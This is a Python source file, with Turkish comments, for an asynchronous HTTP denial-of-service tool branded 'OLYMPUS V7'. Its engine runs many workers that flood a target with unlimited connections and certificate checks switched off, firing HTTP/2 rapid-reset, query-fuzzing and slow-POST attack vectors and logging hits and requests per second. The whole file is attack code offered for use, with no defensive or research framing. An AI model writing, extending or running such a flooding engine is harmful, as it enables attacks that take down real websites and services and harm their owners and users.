import asyncio
import time
from network.vectors import AttackVectors
from core.headers import HeaderFactory
from colorama import Fore


class UltimaEngine:
    def __init__(self, target, threads, proxies=None):
        self.target = target
        self.threads = threads
        self.proxies = proxies
        self.hf = HeaderFactory()
        self.packet_count = 0
        self.error_count = 0
        self.is_running = True

    async def _worker_loop(self):
        # Google Cloud'un ağ kartını sonuna kadar zorlayan limitsiz ayarlar
        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
        timeout = httpx.Timeout(3.0, connect=5.0)

        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=timeout) as client:
            while self.is_running:
                headers = self.hf.create_god_header()
                try:
                    # Hibrit Saldırı Modu: Her vuruşta farklı vektör
                    v1 = await AttackVectors.h2_rapid_reset(client, self.target, headers)
                    v2 = await AttackVectors.query_fuzzing(client, self.target, headers)
                    v3 = await AttackVectors.slow_post_vortex(client, self.target, headers)

                    self.packet_count += (v1 + v2 + v3)
                except Exception:
                    self.error_count += 1
                await asyncio.sleep(0)

    async def logger(self):
        start_time = time.time()
        while self.is_running:
            dur = time.time() - start_time
            rps = int(self.packet_count / dur) if dur > 0 else 0
            print(
                f"{Fore.RED}[!] OLYMPUS V7 >> {Fore.WHITE}Vuruş: {Fore.GREEN}{self.packet_count} {Fore.WHITE}| {Fore.RED}Blok: {self.error_count} {Fore.WHITE}| {Fore.CYAN}Hız: {rps} pk/s",
                end="\r")
            await asyncio.sleep(0.2)

    async def run(self):
        tasks = [asyncio.create_task(self._worker_loop()) for _ in range(self.threads)]
        tasks.append(asyncio.create_task(self.logger()))
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass